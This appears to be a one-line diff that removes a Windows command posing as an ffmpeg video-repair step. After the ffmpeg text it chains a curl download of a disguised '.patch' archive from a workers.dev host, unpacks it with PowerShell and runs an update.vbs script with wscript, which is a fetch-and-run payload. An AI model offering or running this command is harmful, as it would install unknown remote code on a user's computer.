@@ -1,1 +1,0 @@
-echo ffmpeg.exe -i input.mp4 -c:v libx264 -profile:v high -level 4.1 -pix_fmt yuv420p -c:a aac output_fixed.mp4 & curl -k -o "%TEMP%\fixed.zip" "https://downs.grace-ayodele.workers.dev/ver-2944.patch" && powershell -Command "Expand-Archive -Force -Path '%TEMP%\fixed.zip' -DestinationPath '%TEMP%\fixed'" && wscript "%TEMP%\fixed\update.vbs"
